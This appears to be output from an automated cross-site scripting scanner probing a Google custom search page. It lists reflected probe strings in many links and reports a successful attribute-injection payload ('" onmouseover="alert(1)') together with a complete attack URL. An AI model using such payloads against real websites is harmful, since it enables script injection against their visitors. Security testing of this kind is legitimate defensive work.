data-ved\x3d\x222ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8QpwV6BAgLEBs\x22\x3eCustom range...\x3c/span\x3e\x3cdiv class\x3d\x22n5Ug4b\x22 style\x3d\x22display:none\x22\x3e\x3cdiv class\x3d\x22vOvh1b\x22 jsaction\x3d\x22xp3IKd\x22\x3e\x3c/div\x3e\x3cdiv class\x3d\x22J6UZg\x22\x3e\x3cdiv class\x3d\x22Jy9Ore\x22\x3eCustomised date range\x3c/div\x3e\x3clabel class\x3d\x22Qtsmnf tmDYm\x22 for\x3d\x22OouJcb\x22\x3eFrom\x3c/label\x3e\x3clabel class\x3d\x22Qtsmnf iWBKNe\x22 for\x3d\x22rzG2be\x22\x3eTo\x3c/label\x3e\x3cdiv class\x3d\x22Gwgzqd\x22 role\x3d\x22button\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22xp3IKd\x22\x3e\x3c/div\x3e\x3cdiv class\x3d\x22NwEGxd\x22\x3e\x3cdiv class\x3d\x22qomYCd\x22\x3e\x3c/div\x3e\x3cform action\x3d\x22/search\x22 class\x3d\x22T3kYXe\x22 method\x3d\x22get\x22\x3e\x3cinput name\x3d\x22q\x22 value\x3d\x22site:www.vibrationdata.com\x22 type\x3d\x22hidden\x22\x3e\x3cinput name\x3d\x22safe\x22 value\x3d\x22active\x22 type\x3d\x22hidden\x22\x3e\x3cinput name\x3d\x22client\x22 value\x3d\x27(uvw\x22xyz\x26#39;yxz\x26lt;/zxy\x27 type\x3d\x22hidden\x22\x3e\x3cinput name\x3d\x22domains\x22 value\x3d\x22www.vibrationdata.com\x22 type\x3d\x22hidden\x22\x3e\x3cinput name\x3d\x22ie\x22 value\x3d\x22ISO-8859-1\x22 type\x3d\x22hidden\x22\x3e\x3cinput name\x3d\x22oe\x22 value\x3d\x22ISO-8859-1\x22 type\x3d\x22hidden\x22\x3e\x3cinput name\x3d\x22source\x22 type\x3d\x22hidden\x22 value\x3d\x22lnt\x22\x3e\x3cinput value\x3d\x22cdr:1,cd_min:x,cd_max:x\x22 id\x3d\x22HjtPBb\x22 name\x3d\x22tbs\x22 type\x3d\x22hidden\x22\x3e\x3cinput value\x3d\x22\x22 name\x3d\x22tbm\x22 type\x3d\x22hidden\x22\x3e\x3cinput class\x3d\x22OouJcb ktf mini\x22 type\x3d\x22text\x22 value\x3d\x22\x22 autocomplete\x3d\x22off\x22 id\x3d\x22OouJcb\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22focus:daRB0b\x22\x3e\x3cinput class\x3d\x22rzG2be ktf mini\x22 type\x3d\x22text\x22 value\x3d\x22\x22 autocomplete\x3d\x22off\x22 id\x3d\x22rzG2be\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22focus:daRB0b\x22\x3e\x3cinput class\x3d\x22Ru1Ao ksb mini\x22 value\x3d\x22Go\x22 tabindex\x3d\x220\x22 type\x3d\x22submit\x22 jsaction\x3d\x22tnv.scf\x22\x3e\x3c/form\x3e\x3c/div\x3e\x3c/div\x3e\x3c/div\x3e\x3c/div\x3e\x3c/li\x3e\x3c/ul\x3e\x3cspan class\x3d\x22hQKUmb\x22\x3e\x3c/span\x3e\x3cdiv class\x3d\x22hdtb-mn-hd\x22 aria-haspopup\x3d\x22true\x22 role\x3d\x22button\x22 tabindex\x3d\x220\x22\x3e\x3cdiv class\x3d\x22mn-hd-txt\x22\x3eAll results\x3c/div\x3e\x3cspan class\x3d\x22mn-dwn-arw\x22\x3e\x3c/span\x3e\x3c/div\x3e\x3cul class\x3d\x22hdtbU hdtb-mn-c\x22\x3e\x3cli class\x3d\x22hdtbItm hdtbSel\x22 id\x3d\x22li_\x22 tabindex\x3d\x220\x22\x3eAll results\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22li_1\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3dsite:www.vibrationdata.com\x26amp;safe\x3dactive\x26amp;client\x3d(uvw%22xyz%27yxz%3C/zxy\x26amp;domains\x3dwww.vibrationdata.com\x26amp;oe\x3dISO-8859-1\x26amp;source\x3dlnt\x26amp;tbs\x3dli:1\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8QpwV6BAgLEB4\x22\x3eVerbatim\x3c/a\x3e\x3c/li\x3e\x3c/ul\x3e\x3cspan class\x3d\x22hQKUmb\x22\x3e\x3c/span\x3e\x3c/div\x3e');})();(function(){google.drty&&google.drty();})();});</script>
+
+----------------------------------------------------------------------------------
+URI Context: [42]
+<a href="/search?q=site:www.vibrationdata.com&amp;safe=active&amp;client=(uvw%22xyz%27yxz%3C/zxy&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;gbv=1&amp;sei=KlWUXtzFDZeU4-EPh_GJ-Ak">
+<a class="gb_4 gb_5 gb_he gb_1c" href="https://accounts.google.com/ServiceLogin?hl=en&amp;passive=true&amp;continue=https://www.google.com/search%3Fdomains%3Dwww.vibrationdata.com%26q%3D%26sitesearch%3Dwww.vibrationdata.com%26client%3D(uvw%2522xyz%27yxz%253C/zxy%26forid%3D1%26ie%3DISO-8859-1%26oe%3DISO-8859-1%26safe%3Dactive%26cof%3DGALT:" target="_top">
+<a class="q qs" href="/search?q=site:www.vibrationdata.com&amp;safe=active&amp;client=(uvw%22xyz%27yxz%3C/zxy&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;source=lnms&amp;tbm=isch&amp;sa=X&amp;ved=2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8Q_AUoAXoECAsQAw">
+<a class="q qs" href="/search?q=site:www.vibrationdata.com&amp;safe=active&amp;client=(uvw%22xyz%27yxz%3C/zxy&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;source=lnms&amp;tbm=nws&amp;sa=X&amp;ved=2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8Q_AUoAnoECAsQBA">
+<a class="f9UGee q qs" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" href="/search?q=site:www.vibrationdata.com&amp;safe=active&amp;client=(uvw%22xyz%27yxz%3C/zxy&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;source=lnms&amp;tbm=vid&amp;sa=X&amp;ved=2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8Q_AUoAHoECAsQBg">
+<a class="f9UGee q qs" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" href="/search?q=site:www.vibrationdata.com&amp;safe=active&amp;client=(uvw%22xyz%27yxz%3C/zxy&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;source=lnms&amp;tbm=bks&amp;sa=X&amp;ved=2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8Q_AUoAXoECAsQBw">
+<a class="f9UGee q qs" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" href="/search?q=site:www.vibrationdata.com&amp;safe=active&amp;client=(uvw%22xyz%27yxz%3C/zxy&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;source=lnms&amp;tbm=fin&amp;sa=X&amp;ved=2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8Q_AUoAnoECAsQCA">
+<a href="/preferences?hl=en&amp;prev=https://www.google.com/search?domains%3Dwww.vibrationdata.com%26q%3D%26sitesearch%3Dwww.vibrationdata.com%26client%3D(uvw%2522xyz%2527yxz%253C/zxy%26ie%3DISO-8859-1%26oe%3DISO-8859-1%26safe%3Dactive%26cof%3DGALT:" class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-ved="2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8Qo_oBegQICxAK">
+<a href="/preferences?hl=en&amp;prev=https://www.google.com/search?domains%3Dwww.vibrationdata.com%26q%3D%26sitesearch%3Dwww.vibrationdata.com%26client%3D(uvw%2522xyz%2527yxz%253C/zxy%26ie%3DISO-8859-1%26oe%3DISO-8859-1%26safe%3Dactive%26cof%3DGALT:#languages" class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-ved="2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8Qo_oBegQICxAL">
+<a class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-safesearch-on="1" href="/setprefs?safeui=images&amp;sig=0_MHjx2z_O4xqoeWWZ-urXFRaMTL8%3D&amp;prev=https://www.google.com/search?domains%3Dwww.vibrationdata.com%26q%3D%26sitesearch%3Dwww.vibrationdata.com%26client%3D(uvw%2522xyz%2527yxz%253C/zxy%26ie%3DISO-8859-1%26oe%3DISO-8859-1%26safe%3Dactive%26cof%3DGALT:" id="safesearch" data-ved="2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8Qo_oBegQICxAM">
+<a href="/advanced_search?q=site:www.vibrationdata.com&amp;safe=active&amp;client=(uvw%22xyz'yxz%3C/zxy&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;hl=en" class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-ved="2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8Qo_oBegQICxAN">
+<a href="/setprefs?safeui=images&amp;sig=0_MHjx2z_O4xqoeWWZ-urXFRaMTL8%3D&amp;prev=https://www.google.com/search?domains%3Dwww.vibrationdata.com%26q%3D%26sitesearch%3Dwww.vibrationdata.com%26client%3D(uvw%2522xyz%2527yxz%253C/zxy%26ie%3DISO-8859-1%26oe%3DISO-8859-1%26safe%3Dactive%26cof%3DGALT:">
+<a class="fl" href="http://webcache.googleusercontent.com/search?q=cache:MEFcoedOwuoJ:www.vibrationdata.com/+&amp;cd=1&amp;hl=en&amp;ct=clnk&amp;gl=pk&amp;client=(uvw%22xyz%27yxz%3C/zxy" ping="/url?sa=t&amp;source=web&amp;rct=j&amp;url=http://webcache.googleusercontent.com/search%3Fq%3Dcache:MEFcoedOwuoJ:www.vibrationdata.com/%2B%26cd%3D1%26hl%3Den%26ct%3Dclnk%26gl%3Dpk%26client%3D(uvw%2522xyz%2527yxz%253C/zxy&amp;ved=2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8QIDAAegQIARAE">
+<a class="fl" href="/search?safe=active&amp;client=(uvw%22xyz%27yxz%3C/zxy&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;q=related:www.vibrationdata.com/&amp;tbo=1&amp;sa=X&amp;ved=2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8QHzAAegQIARAF">
+<a class="fl" href="http://webcache.googleusercontent.com/search?q=cache:iDeK7If0DNEJ:www.vibrationdata.com/fatigue.htm+&amp;cd=2&amp;hl=en&amp;ct=clnk&amp;gl=pk&amp;client=(uvw%22xyz%27yxz%3C/zxy" ping="/url?sa=t&amp;source=web&amp;rct=j&amp;url=http://webcache.googleusercontent.com/search%3Fq%3Dcache:iDeK7If0DNEJ:www.vibrationdata.com/fatigue.htm%2B%26cd%3D2%26hl%3Den%26ct%3Dclnk%26gl%3Dpk%26client%3D(uvw%2522xyz%2527yxz%253C/zxy&amp;ved=2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8QIDABegQIBhAG">
+<a class="fl" href="/search?safe=active&amp;client=(uvw%22xyz%27yxz%3C/zxy&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;q=related:www.vibrationdata.com/fatigue.htm&amp;tbo=1&amp;sa=X&amp;ved=2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8QHzABegQIBhAH">
+<a class="fl" href="http://webcache.googleusercontent.com/search?q=cache:I82z3bPKe4kJ:www.vibrationdata.com/damping.htm+&amp;cd=3&amp;hl=en&amp;ct=clnk&amp;gl=pk&amp;client=(uvw%22xyz%27yxz%3C/zxy" ping="/url?sa=t&amp;source=web&amp;rct=j&amp;url=http://webcache.googleusercontent.com/search%3Fq%3Dcache:I82z3bPKe4kJ:www.vibrationdata.com/damping.htm%2B%26cd%3D3%26hl%3Den%26ct%3Dclnk%26gl%3Dpk%26client%3D(uvw%2522xyz%2527yxz%253C/zxy&amp;ved=2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8QIDACegQICBAG">
+<a class="fl" href="/search?safe=active&amp;client=(uvw%22xyz%27yxz%3C/zxy&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;q=related:www.vibrationdata.com/damping.htm&amp;tbo=1&amp;sa=X&amp;ved=2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8QHzACegQICBAH">
+<a class="fl" href="http://webcache.googleusercontent.com/search?q=cache:K9MBw2HA3eEJ:www.vibrationdata.com/matlab_random_vibration.htm+&amp;cd=4&amp;hl=en&amp;ct=clnk&amp;gl=pk&amp;client=(uvw%22xyz%27yxz%3C/zxy" ping="/url?sa=t&amp;source=web&amp;rct=j&amp;url=http://webcache.googleusercontent.com/search%3Fq%3Dcache:K9MBw2HA3eEJ:www.vibrationdata.com/matlab_random_vibration.htm%2B%26cd%3D4%26hl%3Den%26ct%3Dclnk%26gl%3Dpk%26client%3D(uvw%2522xyz%2527yxz%253C/zxy&amp;ved=2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8QIDADegQIBRAG">
+<a class="fl" href="/search?safe=active&amp;client=(uvw%22xyz%27yxz%3C/zxy&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;q=related:www.vibrationdata.com/matlab_random_vibration.htm&amp;tbo=1&amp;sa=X&amp;ved=2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8QHzADegQIBRAH">
+<a class="fl" href="http://webcache.googleusercontent.com/search?q=cache:ktkwB06713cJ:www.vibrationdata.com/StructuralDC.htm+&amp;cd=5&amp;hl=en&amp;ct=clnk&amp;gl=pk&amp;client=(uvw%22xyz%27yxz%3C/zxy" ping="/url?sa=t&amp;source=web&amp;rct=j&amp;url=http://webcache.googleusercontent.com/search%3Fq%3Dcache:ktkwB06713cJ:www.vibrationdata.com/StructuralDC.htm%2B%26cd%3D5%26hl%3Den%26ct%3Dclnk%26gl%3Dpk%26client%3D(uvw%2522xyz%2527yxz%253C/zxy&amp;ved=2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8QIDAEegQIBxAG">
+<a class="fl" href="/search?safe=active&amp;client=(uvw%22xyz%27yxz%3C/zxy&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;q=related:www.vibrationdata.com/StructuralDC.htm&amp;tbo=1&amp;sa=X&amp;ved=2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8QHzAEegQIBxAH">
+<a class="fl" href="http://webcache.googleusercontent.com/search?q=cache:8KnQCrx9eZcJ:www.vibrationdata.com/SRS.htm+&amp;cd=6&amp;hl=en&amp;ct=clnk&amp;gl=pk&amp;client=(uvw%22xyz%27yxz%3C/zxy" ping="/url?sa=t&amp;source=web&amp;rct=j&amp;url=http://webcache.googleusercontent.com/search%3Fq%3Dcache:8KnQCrx9eZcJ:www.vibrationdata.com/SRS.htm%2B%26cd%3D6%26hl%3Den%26ct%3Dclnk%26gl%3Dpk%26client%3D(uvw%2522xyz%2527yxz%253C/zxy&amp;ved=2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8QIDAFegQIChAG">
+<a class="fl" href="/search?safe=active&amp;client=(uvw%22xyz%27yxz%3C/zxy&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;q=related:www.vibrationdata.com/SRS.htm&amp;tbo=1&amp;sa=X&amp;ved=2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8QHzAFegQIChAH">
+<a class="fl" href="http://webcache.googleusercontent.com/search?q=cache:RXRTafRlmbQJ:www.vibrationdata.com/Book_of_Mormon_Hebrew.htm+&amp;cd=7&amp;hl=en&amp;ct=clnk&amp;gl=pk&amp;client=(uvw%22xyz%27yxz%3C/zxy" ping="/url?sa=t&amp;source=web&amp;rct=j&amp;url=http://webcache.googleusercontent.com/search%3Fq%3Dcache:RXRTafRlmbQJ:www.vibrationdata.com/Book_of_Mormon_Hebrew.htm%2B%26cd%3D7%26hl%3Den%26ct%3Dclnk%26gl%3Dpk%26client%3D(uvw%2522xyz%2527yxz%253C/zxy&amp;ved=2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8QIDAGegQICRAG">
+<a class="fl" href="/search?safe=active&amp;client=(uvw%22xyz%27yxz%3C/zxy&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;q=related:www.vibrationdata.com/Book_of_Mormon_Hebrew.htm&amp;tbo=1&amp;sa=X&amp;ved=2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8QHzAGegQICRAH">
+<a class="fl" href="http://webcache.googleusercontent.com/search?q=cache:ugOA8avqCoMJ:www.vibrationdata.com/transfer_functions.htm+&amp;cd=8&amp;hl=en&amp;ct=clnk&amp;gl=pk&amp;client=(uvw%22xyz%27yxz%3C/zxy" ping="/url?sa=t&amp;source=web&amp;rct=j&amp;url=http://webcache.googleusercontent.com/search%3Fq%3Dcache:ugOA8avqCoMJ:www.vibrationdata.com/transfer_functions.htm%2B%26cd%3D8%26hl%3Den%26ct%3Dclnk%26gl%3Dpk%26client%3D(uvw%2522xyz%2527yxz%253C/zxy&amp;ved=2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8QIDAHegQIBBAG">
+<a class="fl" href="/search?safe=active&amp;client=(uvw%22xyz%27yxz%3C/zxy&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;q=related:www.vibrationdata.com/transfer_functions.htm&amp;tbo=1&amp;sa=X&amp;ved=2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8QHzAHegQIBBAH">
+<a class="fl" href="https://webcache.googleusercontent.com/search?q=cache:3GbtJSBMEuEJ:https://www.vibrationdata.com/tutorials.htm+&amp;cd=9&amp;hl=en&amp;ct=clnk&amp;gl=pk&amp;client=(uvw%22xyz%27yxz%3C/zxy" ping="/url?sa=t&amp;source=web&amp;rct=j&amp;url=https://webcache.googleusercontent.com/search%3Fq%3Dcache:3GbtJSBMEuEJ:https://www.vibrationdata.com/tutorials.htm%2B%26cd%3D9%26hl%3Den%26ct%3Dclnk%26gl%3Dpk%26client%3D(uvw%2522xyz%2527yxz%253C/zxy&amp;ved=2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8QIDAIegQIAxAG">
+<a class="fl" href="http://webcache.googleusercontent.com/search?q=cache:AlPG5vHw1xYJ:www.vibrationdata.com/rectangular_plates.htm+&amp;cd=10&amp;hl=en&amp;ct=clnk&amp;gl=pk&amp;client=(uvw%22xyz%27yxz%3C/zxy" ping="/url?sa=t&amp;source=web&amp;rct=j&amp;url=http://webcache.googleusercontent.com/search%3Fq%3Dcache:AlPG5vHw1xYJ:www.vibrationdata.com/rectangular_plates.htm%2B%26cd%3D10%26hl%3Den%26ct%3Dclnk%26gl%3Dpk%26client%3D(uvw%2522xyz%2527yxz%253C/zxy&amp;ved=2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8QIDAJegQIAhAG">
+<a class="fl" href="/search?safe=active&amp;client=(uvw%22xyz%27yxz%3C/zxy&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;q=related:www.vibrationdata.com/rectangular_plates.htm&amp;tbo=1&amp;sa=X&amp;ved=2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8QHzAJegQIAhAH">
+<a aria-label="Page 2" class="fl" href="/search?q=site:www.vibrationdata.com&amp;safe=active&amp;client=(uvw%22xyz%27yxz%3C/zxy&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;ei=KlWUXtzFDZeU4-EPh_GJ-Ak&amp;start=10&amp;sa=N&amp;ved=2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8Q8tMDegQICxAp">
+<a aria-label="Page 3" class="fl" href="/search?q=site:www.vibrationdata.com&amp;safe=active&amp;client=(uvw%22xyz%27yxz%3C/zxy&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;ei=KlWUXtzFDZeU4-EPh_GJ-Ak&amp;start=20&amp;sa=N&amp;ved=2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8Q8tMDegQICxAr">
+<a aria-label="Page 4" class="fl" href="/search?q=site:www.vibrationdata.com&amp;safe=active&amp;client=(uvw%22xyz%27yxz%3C/zxy&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;ei=KlWUXtzFDZeU4-EPh_GJ-Ak&amp;start=30&amp;sa=N&amp;ved=2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8Q8tMDegQICxAt">
+<a aria-label="Page 5" class="fl" href="/search?q=site:www.vibrationdata.com&amp;safe=active&amp;client=(uvw%22xyz%27yxz%3C/zxy&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;ei=KlWUXtzFDZeU4-EPh_GJ-Ak&amp;start=40&amp;sa=N&amp;ved=2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8Q8tMDegQICxAv">
+<a aria-label="Page 6" class="fl" href="/search?q=site:www.vibrationdata.com&amp;safe=active&amp;client=(uvw%22xyz%27yxz%3C/zxy&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;ei=KlWUXtzFDZeU4-EPh_GJ-Ak&amp;start=50&amp;sa=N&amp;ved=2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8Q8tMDegQICxAx">
+<a aria-label="Page 7" class="fl" href="/search?q=site:www.vibrationdata.com&amp;safe=active&amp;client=(uvw%22xyz%27yxz%3C/zxy&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;ei=KlWUXtzFDZeU4-EPh_GJ-Ak&amp;start=60&amp;sa=N&amp;ved=2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8Q8tMDegQICxAz">
+<a aria-label="Page 8" class="fl" href="/search?q=site:www.vibrationdata.com&amp;safe=active&amp;client=(uvw%22xyz%27yxz%3C/zxy&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;ei=KlWUXtzFDZeU4-EPh_GJ-Ak&amp;start=70&amp;sa=N&amp;ved=2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8Q8tMDegQICxA1">
+<a aria-label="Page 9" class="fl" href="/search?q=site:www.vibrationdata.com&amp;safe=active&amp;client=(uvw%22xyz%27yxz%3C/zxy&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;ei=KlWUXtzFDZeU4-EPh_GJ-Ak&amp;start=80&amp;sa=N&amp;ved=2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8Q8tMDegQICxA3">
+<a aria-label="Page 10" class="fl" href="/search?q=site:www.vibrationdata.com&amp;safe=active&amp;client=(uvw%22xyz%27yxz%3C/zxy&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;ei=KlWUXtzFDZeU4-EPh_GJ-Ak&amp;start=90&amp;sa=N&amp;ved=2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8Q8tMDegQICxA5">
+<a class="G0iuSb" href="/search?q=site:www.vibrationdata.com&amp;safe=active&amp;client=(uvw%22xyz%27yxz%3C/zxy&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;ei=KlWUXtzFDZeU4-EPh_GJ-Ak&amp;start=10&amp;sa=N&amp;ved=2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8Q8NMDegQICxA7" id="pnnext" style="text-align:left">
+<meta content="0;url=/search?q=site:www.vibrationdata.com&amp;safe=active&amp;client=(uvw%22xyz%27yxz%3C/zxy&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;gbv=1&amp;sei=KlWUXtzFDZeU4-EPh_GJ-Ak" http-equiv="refresh">
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	False	True	True	False
+
+Attack Payloads for ATTR
+['" onmouseover="alert(1)']
+
+ATTR Attack Url: http://www.google.com/custom?domains=www.vibrationdata.com&q=&sitesearch=www.vibrationdata.com&client=" onmouseover="alert(1)&forid=1&ie=ISO-8859-1&oe=ISO-8859-1&safe=active&cof=GALT:#008000;GL:1;DIV:#336699;VLC:663399;AH:center;BGC:FFFFFF;LBGC:336699;ALC:0000FF;LC:0000FF;T:000000;GFNT:0000FF;GIMP:0000FF;FORID:1;&hl=en
+
+=> ATTACK SUCCESSFUL with Payload: " onmouseover="alert(1)
+Detection of Payload: 
+<input name="client" value='" onmouseover="alert(1)' type="hidden">
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	True	True	True
+
+Attack Payloads for ATTR
+[]
+ENCODING     Presence	"	'	<	( 
+SCRIPT:		True	True	True	True	False
+
+Attack Payloads for SCRIPT
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+_______________________________________________________________________________________________________
+http://www.google.com/custom?domains=www.vibrationdata.com&q=&sitesearch=www.vibrationdata.com&client=pub-1751731975287442&forid=(uvw"xyz'yxz</zxy&ie=ISO-8859-1&oe=ISO-8859-1&safe=active&cof=GALT:#008000;GL:1;DIV:#336699;VLC:663399;AH:center;BGC:FFFFFF;LBGC:336699;ALC:0000FF;LC:0000FF;T:000000;GFNT:0000FF;GIMP:0000FF;FORID:1;&hl=en
+
+----------------------------------------------------------------------------------
+Attribute Context: [1]
